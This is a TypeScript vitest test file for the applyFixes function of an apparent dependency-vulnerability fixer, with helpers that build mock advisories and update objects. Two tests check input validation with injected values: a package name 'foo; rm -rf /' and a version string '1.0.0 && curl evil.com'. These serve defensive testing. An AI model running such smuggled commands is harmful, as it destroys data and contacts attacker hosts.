import { describe, it, expect, vi } from 'vitest';
import type { SafeUpdate } from '../../src/core/fixer/safe-update.js';
import type { ScoredVulnerability } from '../../src/types/report.js';
import type { Advisory, AdvisoryMatch } from '../../src/types/advisory.js';

// Mock safeExec before importing the module under test so npm install never runs
vi.mock('../../src/utils/shell.js', async (importOriginal) => {
  const original = await importOriginal<typeof import('../../src/utils/shell.js')>();
  return {
    ...original,
    safeExec: vi.fn().mockResolvedValue({ stdout: '', stderr: '', exitCode: 0 }),
  };
});

// Must import after vi.mock
const { applyFixes } = await import('../../src/core/fixer/lockfile-writer.js');

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeAdvisory(overrides: Partial<Advisory> = {}): Advisory {
  return {
    id: 'GHSA-test-test-test',
    aliases: ['CVE-2024-0001'],
    summary: 'Test advisory',
    details: '',
    severity: [{ type: 'CVSS_V3', score: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' }],
    affectedRange: '>=1.0.0 <2.0.0',
    fixVersion: '1.5.1',
    publishedAt: '2024-01-01',
    modifiedAt: '2024-01-01',
    references: [],
    source: 'osv-api',
    ...overrides,
  };
}

function makeMatch(overrides: Partial<AdvisoryMatch> = {}): AdvisoryMatch {
  return {
    advisory: makeAdvisory(),
    package: 'vulnerable-pkg',
    installedVersion: '1.5.0',
    dependencyPath: ['vulnerable-pkg'],
    isProduction: true,
    ...overrides,
  };
}

function makeVuln(overrides: Partial<ScoredVulnerability> = {}): ScoredVulnerability {
  return {
    match: makeMatch(),
    risk: {
      score: 75,
      label: 'high',
      factors: {
        cvssScore: 9.8,
        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
        productionReachable: true,
        directlyImported: false,
        exploitAvailable: false,
        epssScore: null,
        inKev: false,
        fixAvailable: true,
        fixVersion: '1.5.1',
        depth: 1,
        directDependency: true,
      },
    },
    ...overrides,
  };
}

function makeSafeUpdate(overrides: Partial<SafeUpdate> = {}): SafeUpdate {
  return {
    vuln: makeVuln(),
    packageName: 'vulnerable-pkg',
    currentVersion: '1.5.0',
    fixVersion: '1.5.1',
    reason: 'within-parent-range',
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('applyFixes', () => {
  it('returns empty applied and failed for empty updates array', async () => {
    const result = await applyFixes('/tmp/nonexistent', []);

    expect(result.applied).toHaveLength(0);
    expect(result.failed).toHaveLength(0);
  });

  it('fails validation before touching files for invalid package name', async () => {
    const maliciousUpdate = makeSafeUpdate({
      packageName: 'foo; rm -rf /',
      fixVersion: '1.0.0',
    });

    const result = await applyFixes('/tmp/nonexistent', [maliciousUpdate]);

    expect(result.failed).toHaveLength(1);
    expect(result.failed[0].packageName).toBe('foo; rm -rf /');
    expect(result.failed[0].reason).toContain('Invalid package name');
    expect(result.applied).toHaveLength(0);
  });

  it('fails validation for invalid version string', async () => {
    const maliciousUpdate = makeSafeUpdate({
      packageName: 'lodash',
      fixVersion: '1.0.0 && curl evil.com',
    });

    const result = await applyFixes('/tmp/nonexistent', [maliciousUpdate]);

    expect(result.failed).toHaveLength(1);
    expect(result.failed[0].reason).toContain('Invalid version string');
    expect(result.applied).toHaveLength(0);
  });
});
